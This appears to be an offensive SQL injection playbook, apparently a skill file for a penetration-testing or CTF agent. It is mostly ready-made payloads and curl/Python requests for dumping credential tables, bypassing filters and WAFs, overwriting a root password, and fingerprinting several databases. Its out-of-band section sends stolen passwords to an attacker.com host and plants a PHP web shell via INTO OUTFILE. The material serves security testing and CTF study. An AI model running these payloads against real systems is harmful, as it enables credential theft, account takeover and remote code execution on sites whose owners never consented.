# SQL Injection

## Trigger

Load when you see: **login forms** with distinct error messages; **numeric IDs in URLs** (`/user?id=1`); **search params** (`?q=`, `?search=`); **ORDER BY / sort parameters** (`?sort=name`, `?order=price`) -- column names cannot be parameterized; **report generation** (PDF/CSV export); **HTTP headers** (`X-Forwarded-For`, `Host`, `User-Agent`); **registration flows with profile update** (second-order); **upload endpoints** (EXIF metadata, QR codes, XML/SOAP); **any param mapped to a DB column name**.

## Attack Surface

- **Relational databases**: MySQL, PostgreSQL, MSSQL, Oracle, SQLite -- each has distinct syntax, functions, enumeration paths
- **Concatenated queries**: `"SELECT * FROM users WHERE id = " + id`
- **Dynamic SQL**: `EXEC('SELECT * FROM ' + @table)`
- **ORMs with raw SQL**: ActiveRecord `where()`, Hibernate `createNativeQuery()`, Django `raw()`, EF `FromSql()`
- **ORDER BY clauses**: cannot use parameterized queries in most dialects
- **IN clauses**: `WHERE id IN (` + ids.join(',') + `)`
- **LIKE patterns**: `WHERE name LIKE '%" + input + "%'`
- **INSERT/UPDATE from metadata**: EXIF, QR codes, XML/SOAP content
- **Headers logged to DB**: analytics, audit trails, session init code
- **Multi-byte charsets**: Shift-JIS, GBK, EUC-JP -- charset mismatch defeats escape functions

## Decision Tree

```
1. IDENTIFY INJECTION POINT
   ' → SQL error?     → Likely injectable
   OR 1=1             → Different response? → Likely injectable
   SLEEP(5)            → Delayed? → Confirmed
   ORDER BY 1..N       → Error at N+1 → Column count
   UNION SELECT NULL.. → Match column count

2. DETERMINE DB TYPE
   MySQL:   version(), @@version, database(), user()
   MSSQL:   @@VERSION, DB_NAME(), USER_NAME()
   Oracle:  (SELECT banner FROM v$version), (SELECT user FROM dual)
   PgSQL:   version(), current_database()
   SQLite:  sqlite_version(); "near ... syntax error" in errors

3. SELECT EXTRACTION METHOD
   Results visible inline? → UNION-based (fastest)
   Error messages shown?   → Error-based
   Boolean observable?     → Blind boolean (binary search)
   Time measurable?        → Time-based blind
   DNS/HTTP exfil?         → Out-of-band

4. EXTRACT SCHEMA
   MySQL:    information_schema.tables/columns (alt: mysql.innodb_table_stats)
   MSSQL:    information_schema.tables, sys.tables, sys.columns
   Oracle:   all_tables, all_tab_columns
   PgSQL:    information_schema.tables, pg_catalog.pg_tables
   SQLite:   sqlite_master(type,name,tbl_name,sql)

5. EXTRACT DATA
   Single row: LIMIT 1 / TOP 1 / ROWNUM=1 / FETCH FIRST
   All rows: GROUP_CONCAT() / STRING_AGG() / LISTAGG() / FOR XML PATH('')
```

## Techniques

### UNION-Based

```
# Column count: ' ORDER BY 3-- → Error → 2 columns
# String-compatible column: ' UNION SELECT 'a',NULL-- → column 1 is string
' UNION SELECT @@version, database()--
' UNION SELECT table_name,2 FROM information_schema.tables WHERE table_schema=database()--
' UNION SELECT group_concat(username,0x3a,password),2 FROM users--
# MSSQL: ' UNION SELECT (SELECT CAST(username+':'+password AS NVARCHAR(4000)) FROM users FOR XML PATH('')), NULL--
# Oracle: ' UNION SELECT table_name,NULL FROM all_tables WHERE ROWNUM=1--
# SQLite: ' UNION SELECT name,sql FROM sqlite_master WHERE type='table'--
```

### Error-Based

```
# MySQL extractvalue/updatexml XPath error leak
' AND extractvalue(1, concat(0x7e, (SELECT password FROM users LIMIT 1)))--
' AND updatexml(1, concat(0x7e, (SELECT @@version)), 1)--
# Alternatives when the above are blocked:
' AND GEOMETRYCOLLECTION((SELECT * FROM (SELECT * FROM (SELECT version())a)b))--
' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7e,version())) USING utf8)))--
# MSSQL: ' AND 1=CONVERT(INT, (SELECT @@VERSION))--
# PgSQL: ' AND 1=CAST((SELECT version()) AS INTEGER)--
```

### Blind Boolean

```
# Confirm oracle: ' AND 1=1-- vs ' AND 1=2--
# Binary search: ' AND ASCII(SUBSTR(database(),1,1))>100-- → true then narrow
' AND ORD(MID(database(),1,1)) BETWEEN 97 AND 122--
' AND password LIKE 'f%'--
# BETWEEN tautology (when =,<,> blocked):
' AND id BETWEEN id AND id AND SUBSTR((SELECT flag FROM flags LIMIT 1),1,1) BETWEEN 'a' AND 'z'--
# REGEXP oracle (when AND/IF/SUBSTRING blocked):
' UNION SELECT NULL FROM users WHERE pw REGEXP '^a'--
```

### Time-Based

```
# MySQL: ' AND IF(ASCII(SUBSTR(database(),1,1))>96, SLEEP(3), 0)--
# MySQL alt (SLEEP blocked): ' AND IF(..., BENCHMARK(5000000, SHA1('x')), 0)--
# PgSQL: ' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--
# MSSQL: '; IF (ASCII(SUBSTRING((SELECT DB_NAME()),1,1))>96) WAITFOR DELAY '0:0:5'--
# Oracle: ' AND 1=CASE WHEN (1=1) THEN DBMS_PIPE.RECEIVE_MESSAGE('x',5) ELSE 0 END--
# SQLite (no SLEEP): ' AND 1=randomblob(300000000)-- → ~2-3s delay
```

### Out-of-Band

```
# MySQL LOAD_FILE UNC path: ' UNION SELECT LOAD_FILE(CONCAT('\\\\', (SELECT pw FROM users LIMIT 1), '.attacker.com\\x'))--
# MySQL INTO OUTFILE: ' UNION SELECT 1,'<?php system($_GET[c]);?>',3 INTO OUTFILE '/var/www/html/shell.php'--
# MSSQL xp_cmdshell DNS: '; EXEC master..xp_cmdshell 'nslookup '+(SELECT TOP 1 password FROM users)+'.attacker.com'--
# Oracle UTL_HTTP: ' UNION SELECT UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT password FROM users WHERE rownum=1)),NULL FROM DUAL--
```

### Backslash Escape

Input `\` escapes the closing quote, extending the string to consume the query's own quote.

```
curl -X POST http://target/login -d 'username=\&password= OR 1=1-- '
curl -X POST http://target/login -d 'username=\&password=UNION SELECT value,2 FROM flag-- '
```

### Hex Encoding for Quote Bypass

```
SELECT 0x6d656f77; -- Returns 'meow'
# Combined with backslash escape + SSTI:
# username=x\&password=) union select 1,0x7b7b73656c662e5f5f696e69745f5f7d7d#
```

### Second-Order SQL Injection

Input is safely escaped on INSERT, retrieved and used unsafely in a later query.

```python
requests.post("http://target/register", data={"username": "admin'-- -", "password": "x"})
# Trigger: password change reads stored username into UPDATE without escaping
requests.post("http://target/profile/update", data={"old_password": "x", "new_password": "hacked"})
```

### Column Truncation (MySQL, VolgaCTF 2014)

MySQL VARCHAR(N) silently truncates and ignores trailing spaces in comparison (PAD SPACE).

```
# VARCHAR(20): pad "admin" to exceed column width
curl -X POST http://target/register -d 'login=admin%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20x&password=attacker123'
curl -X POST http://target/login -d 'login=admin&password=attacker123'
```

### EXIF Metadata Injection

Payloads in image EXIF fields bypass WAFs inspecting form fields but not binary content.

```bash
exiftool -Comment="' UNION SELECT password FROM users--" image.jpg
exiftool -Copyright="' UNION SELECT flag FROM flags--" image.jpg
```

### QR Code Input Injection

```python
payload = "'\tunion\tselect\tsecret_field\tfrom\tmessages\tlike\t'%flag%"
qrcode.make(payload).save("sqli_qr.png")
requests.post('http://target/scan', files={'qr': open('sqli_qr.png', 'rb')})
```

### Double-Keyword Filter Bypass

Nest the blocked keyword inside itself. Single-pass removal reconstructs the original.

```
# sselectelect → select; ununionion → union
), ((selselectect * frofromm (seselectlect load_load_filefile('/flag')) as a limit 0,1),'2')#
```

### INSERT ON DUPLICATE KEY UPDATE

Overwrite existing user passwords when INSERT is allowed but SELECT is not.

```python
payload = "'),('','root','z')ON DUPLICATE KEY UPDATE password='hacked'#"
requests.post("http://target/register", data={"username": payload, "password": "x"})
requests.post("http://target/login", data={"username": "root", "password": "hacked"})
```

### Inline Comment Multi-Field Split (picoCTF 2018)

```
# username = '/*  |  password = */ OR 1=1 --
# MySQL: WHERE name=''/*' AND password='*/ OR 1=1 -- '
```

### Quote-Adjacent UNION Bypass (TAMUctf 2019)

WAFs looking for `" UNION "` miss `'UNION` -- the lexer treats the closing quote as a token boundary.

```
'UNION SELECT @@VERSION #
'UNION ALL SELECT GROUP_CONCAT(table_schema) FROM information_schema.tables #
```

## Bypass

### Keyword Obfuscation

```
# MySQL inline comment: ' /*!UNION*/ /*!SELECT*/ 1,database(),3--
# Case: ' UnIoN SeLeCt 1,database(),3--
# Double-write: ' UNUNIONION SELSELECTECT 1,database(),3--
# URL encoding: ' %55%4e%49%4f%4e %53%45%4c%45%43%54 1,2,3--
# Newline: ' uNiOn%23%0aSeLeCt 1,2,3--
# Null byte: ' UNION%00SELECT 1,2,3--
# Tab/newline/VT: ' UNION%0a%09%0d%0bSELECT%0a1,2,3--
# XML entity (SOAP/XML): <id>1 &#x55;&#x4e;&#x49;&#x4f;&#x4e; &#x53;&#x45;&#x4c;&#x45;&#x43;&#x54; username</id>
```

### Comment Insertion / Space Alternatives

```
'/**/UNION/**/SELECT/**/1,database(),3--
'(UNION(SELECT(1),(database()),(3)))--
```

### Schema Enumeration Alternatives

```
# When information_schema blocked (MySQL):
SELECT group_concat(table_name) FROM mysql.innodb_table_stats WHERE database_name=database()
# PROCEDURE ANALYSE() leaks column metadata:
SELECT * FROM users WHERE id BETWEEN id AND id PROCEDURE ANALYSE()
```

### PCRE Backtrack Limit Bypass (PHP)

PHP `preg_match()` returns `false` (not `0`) on backtrack overflow. Append 1M+ characters.

```python
payload = "union select 1,2,3-- " + "a" * 1000001
# preg_match returns false → !false == true → WAF bypassed
```

### Charset Tricks (Shift-JIS, GBK)

In Shift-JIS, yen sign `¥` maps to backslash `0x5c`. Custom escapes add `\` after it, producing `\\` and leaving the quote unescaped.

```javascript
socket.send('{"type":"get_answer","answer":"\\u00a5\\" OR 1=1 -- "}')
```

### Header-Based Injection

Headers rarely inspected by WAFs but common in SQL logging.

```bash
curl -H "Host: ' UNION SELECT * FROM users PROCEDURE ANALYSE()-- " http://target/
# SQLite via X-Forwarded-For cookie oracle:
curl -i http://target/ -H "X-Forwarded-For: pwnd' union select null,null,null,sql from sqlite_master where tbl_name='users' and type='table"
# → Set-Cookie: PHPSESSID=<leaked value>
```

### vsprintf Double-Prepare (AceBear 2018)

```
# username=39 & password=%1$c+or+1=1--+-
# %1$c converts arg 39 → chr(39) → ' → bypasses string escaping
username=39&password=%1$c+union+select+1,group_concat(flag),3+from+flags--+-
```

## Verification

1. **DB errors**: Inject `'` and observe syntax error revealing the query structure and DB type.
2. **SLEEP() delay**: `' OR SLEEP(5)--` → 5s. SQLite: `randomblob(300000000)`. PgSQL: `pg_sleep(5)`. MSSQL: `WAITFOR DELAY '0:0:5'`.
3. **Boolean differential**: `' AND 1=1--` vs `' AND 1=2--` → consistent diff confirms boolean oracle.
4. **UNION reflection**: Literal appears in response after matching column count.
5. **DNS callback**: Oracle UTL_HTTP, MSSQL xp_cmdshell nslookup, MySQL LOAD_FILE UNC → OOB confirmed.
6. **Error-based**: `' AND extractvalue(1,concat(0x7e,(SELECT @@version)))--` → version in error msg.

## Pitfalls

- **Wrong quote type**: Single quote may be escaped, but double quote `"` or backtick may work. Test all three.
- **Blind misreading**: Cached responses, load balancers, rate limiting cause false positives/negatives. Confirm boolean with time-based.
- **ORM vs raw SQL**: An app may parameterize 90% of queries but have a few raw SQL calls. Each endpoint must be tested.
- **Cache false positives**: WAF/CDN caching returns stale pages. Add cache-busting params.
- **ORDER BY assumed safe**: Column names cannot use parameterized queries. Sort params are a persistent injection vector.
- **SQLite false security**: No SLEEP(), but `randomblob()`, `zeroblob()`, heavy `count(*)` all produce measurable delays.
- **Second-order missed by scanners**: Multi-step (store → trigger) requires manual testing.
- **Single bypass reliance**: Layer multiple: case variation + comment insertion + hex encoding simultaneously.
- **Multi-byte encoding regression**: Apps migrated between charsets retain old escape logic. A Shift-JIS endpoint may slip through a UTF-8 WAF.
- **PROCEDURE ANALYSE() side effects**: Heavy table scans. Avoid on production with large tables.
